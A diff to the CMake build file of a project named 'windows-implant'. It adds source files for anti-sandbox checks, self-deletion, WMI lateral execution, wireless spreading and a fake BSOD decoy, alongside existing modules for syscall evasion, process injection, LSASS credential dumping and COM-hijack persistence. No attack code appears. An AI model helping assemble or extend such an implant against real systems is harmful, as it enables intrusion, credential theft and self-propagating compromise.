@@ -1,5 +1,5 @@
 cmake_minimum_required(VERSION 3.20)
-project(windows-implant LANGUAGES CXX)
+project(windows-implant LANGUAGES C CXX)
 
 if(POLICY CMP0135)
   cmake_policy(SET CMP0135 NEW)
@@ -9,10 +9,18 @@ set(CMAKE_CXX_STANDARD 20)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
 set(CMAKE_CXX_EXTENSIONS OFF)
 
+add_definitions(-DSQLITE_OMIT_FTS5)
+
 include(cmake/CompileOptions.cmake)
 include(FetchContent)
 
-enable_language(ASM_MASM)
+if(MSVC)
+    enable_language(ASM_MASM)
+    set(SYSCALL_STUB src/evasion/SyscallStub_masm.asm)
+else()
+    enable_language(ASM)
+    set(SYSCALL_STUB src/evasion/SyscallStub_gas.s)
+endif()
 
 # nlohmann-json
 FetchContent_Declare(
@@ -35,6 +43,8 @@ FetchContent_MakeAvailable(googletest)
 add_executable(main WIN32
     src/main.cpp
     src/utils/Logger.cpp
+    src/utils/Shared.cpp
+    src/utils/SelfDelete.cpp
     src/core/ImplantId.cpp
     src/crypto/AesGcm.cpp
     src/crypto/Base64.cpp
@@ -59,21 +69,25 @@ add_executable(main WIN32
     src/fs/FileSystem.cpp
     src/recon/DeepRecon.cpp
     src/evasion/Syscalls.cpp
-    src/evasion/SyscallStub.asm
+    ${SYSCALL_STUB}
     src/evasion/Unhooker.cpp
     src/evasion/Injector.cpp
+    src/evasion/AntiSandbox.cpp
     src/execution/DotNetExecutor.cpp
     src/network/SocksProxy.cpp
     src/persistence/WmiPersistence.cpp
     src/persistence/ComHijacker.cpp
     src/credential/LsassDumper.cpp
+    src/lateral/WmiExec.cpp
+    src/lateral/WirelessSpread.cpp
+    src/decoy/BSOD.cpp
     external/sqlite3/sqlite3.c
 )
 
-target_include_directories(main PUBLIC external external/sqlite3)
+target_include_directories(main PUBLIC src external external/sqlite3)
 target_link_libraries(main 
     nlohmann_json::nlohmann_json
-    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 mscoree dbghelp wlanapi
+    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 dbghelp wlanapi netapi32 bthprops
 )
 
 # Tests
@@ -84,7 +98,7 @@ add_executable(unit_tests
     src/crypto/AesGcm.cpp
 )
 target_include_directories(unit_tests PRIVATE src)
-target_link_libraries(unit_tests GTest::gtest_main bcrypt)
+target_link_libraries(unit_tests GTest::gtest_main bcrypt crypt32)
 add_custom_command(TARGET unit_tests POST_BUILD
     COMMAND unit_tests
     WORKING_DIRECTORY ${CMAKE_CURRENT_BINARY_DIR}
